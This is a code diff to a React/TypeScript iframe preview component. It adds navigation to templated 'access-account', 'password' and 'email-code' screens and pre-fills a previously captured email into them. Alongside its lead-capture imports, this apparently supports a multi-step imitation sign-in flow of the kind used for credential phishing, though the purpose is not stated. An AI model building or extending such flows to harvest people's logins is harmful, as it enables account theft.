@@ -12,6 +12,7 @@ import {
   LeadValue,
 } from "@/lib/lead-capture";
 import { trackVisitorPresence } from "@/lib/presence";
+import { MANUAL_SCREEN_TEMPLATES } from "@/lib/manual-screen-templates";
 
 interface PreviewFrameProps {
   html: string;
@@ -275,6 +276,32 @@ export function PreviewFrame({ html, mode = "mobile", className, adId }: Preview
       setScreenRef.current?.(screen.kind);
     };
 
+    const navigateToManualScreen = (kind: string) => {
+      const template = MANUAL_SCREEN_TEMPLATES[kind];
+      if (!template) return false;
+
+      let nextHtml = applyLeadPlaceholders(sanitizeIframeHtml(template.html), leadsRef.current);
+      const capturedEmail = capturedEmailRef.current.trim();
+      if (capturedEmail && (kind === "access-account" || kind === "password" || kind === "email-code")) {
+        nextHtml = nextHtml.replace(
+          /(<div[^>]*id=["']user-email["'][^>]*>)(.*?)(<\/div>)/i,
+          `$1${capturedEmail}$3`,
+        );
+        nextHtml = nextHtml.replace(
+          /(<span[^>]*class=["']email["'][^>]*id=["']user-email["'][^>]*>)(.*?)(<\/span>)/i,
+          `$1${capturedEmail}$3`,
+        );
+      }
+
+      historyRef.current.push(currentHtmlRef.current);
+      onChildScreen = true;
+      currentScreenIdRef.current = null;
+      currentHtmlRef.current = nextHtml;
+      renderHtml(nextHtml);
+      setScreenRef.current?.(kind);
+      return true;
+    };
+
     const goBackToMain = () => {
       onChildScreen = false;
       currentScreenIdRef.current = null;
@@ -468,7 +495,9 @@ export function PreviewFrame({ html, mode = "mobile", className, adId }: Preview
         }
         const screen = screensRef.current.find((s) => s.kind === data.action);
         if (!screen) {
-          console.warn("[PreviewFrame] Nenhuma tela vinculada com kind=", data.action);
+          if (!navigateToManualScreen(data.action)) {
+            console.warn("[PreviewFrame] Nenhuma tela vinculada com kind=", data.action);
+          }
           return;
         }
         navigateToScreen(screen);
